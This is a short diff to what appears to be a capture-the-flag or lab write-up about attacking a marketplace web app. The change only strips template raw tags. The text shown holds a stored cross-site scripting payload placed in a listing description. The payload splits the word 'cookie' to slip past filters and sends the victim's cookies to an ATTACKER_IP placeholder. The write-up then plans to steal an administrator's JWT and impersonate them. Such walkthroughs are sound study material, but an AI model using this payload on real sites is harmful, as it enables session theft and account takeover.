@@ -63,11 +63,9 @@ Things are starting to look bad for the marketplace. Let's create a new listing 
 
 I make a new listing with our payload in the description. This is the one I default to using as it almost always bypasses firewalls and works quite well.
 
-{% raw %}
 ```
 <script>var c='coo'+'kie';document.location='http://ATTACKER_IP/?c='+document[c];</script>
 ```
-{% endraw %}
 
 Then we can report it to an administrator and see about stealing a privileged JWT in order to impersonate them.
 
